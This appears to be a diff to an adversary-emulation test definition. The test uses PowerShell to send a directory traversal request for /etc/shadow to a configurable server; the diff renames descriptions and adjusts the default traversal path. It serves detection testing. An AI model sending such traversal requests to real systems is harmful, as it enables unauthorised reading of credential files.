@@ -11,11 +11,11 @@ atomic_tests:
     input_arguments:
         target_server:
             default: 127.0.0.1
-            description: Vulnerable server hostname or IP
+            description: Target server hostname or IP
             type: string
         target_server_port:
             default: 443
-            description: Vulnerable server port
+            description: Target server port
             type: integer
         user_agent:
             default: (Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
@@ -23,13 +23,13 @@ atomic_tests:
             description: User Agent to be used
             type: string
         vulnerable_uri:
-            default: /../../../../etc/shadow
+            default: ../../../../etc/shadow
             description: Common URI structure associated with /etc/shadow directory
                 traversal attempts.
             type: string
     executor:
         command: |
-            Write-Host "Configured to connect to vulnerable server: #{target_server}:#{target_server_port}"
+            Write-Host "Configured to connect to target server: #{target_server}:#{target_server_port}"
             Invoke-WebRequest -Uri 'https://#{target_server}:#{target_server_port}/#{vulnerable_uri}' -UserAgent '#{user_agent}'
         elevation_required: false
         name: powershell
